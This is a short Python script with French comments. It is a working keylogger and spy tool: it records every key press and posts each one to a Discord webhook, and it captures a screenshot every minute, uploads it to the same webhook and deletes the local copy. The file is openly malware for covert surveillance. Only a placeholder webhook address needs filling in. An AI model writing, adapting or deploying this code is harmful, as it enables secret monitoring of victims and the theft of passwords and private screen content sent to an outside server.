import requests
import pyautogui
import time
import threading
import keyboard
import json
import os
webhook_url = "ton webhook discord"
def on_key_press(e):
    data = {"content": f"{e.name}"}
    headers = {"Content-Type": "application/json"}
    requests.post(webhook_url, data=json.dumps(data), headers=headers)
def send_screenshot():
    while True:
        capture_ecran = pyautogui.screenshot()
        capture_ecran.save("capture_ecran.png")
        capture_file = open("capture_ecran.png", "rb")
        payload = {
            "content": "Capture d'écran envoyée avec succès.",
            "file": capture_file
        }
        requests.post(webhook_url, files=payload)
        capture_file.close()
        os.remove("capture_ecran.png")
        time.sleep(60)
screenshot_thread = threading.Thread(target=send_screenshot)
screenshot_thread.start()
keyboard.on_press(on_key_press)
keyboard.wait()